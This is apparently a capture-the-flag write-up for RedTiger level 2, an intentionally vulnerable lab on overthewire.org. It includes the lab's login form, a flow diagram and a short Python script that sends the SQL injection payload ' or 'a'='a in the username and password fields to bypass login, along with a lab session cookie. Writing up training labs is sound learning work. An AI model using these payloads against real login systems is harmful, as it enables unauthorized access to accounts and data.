================================================================================================================
[redtiger] level2
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="username=' or 'a'='a&password=' or 'a'='a",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|

Source Analysis
================================================================================================================

- Target: Login 
- Hint: Condition 

.. code-block:: html

    <form method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" name="login" value="Login">
    </form>
    

|

or injection
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level2.php"
    cookies = {
        "level2login":"easylevelsareeasy_%21"
    }

    # ' or 1=1
    # ' or 'a'='a
    payload = {
        "username": "' or 'a'='a",
        "password": "' or 'a'='a",
        "login": "Login"
    }

    r = requests.post(url, cookies=cookies, data=payload, verify=False)

    print r.content

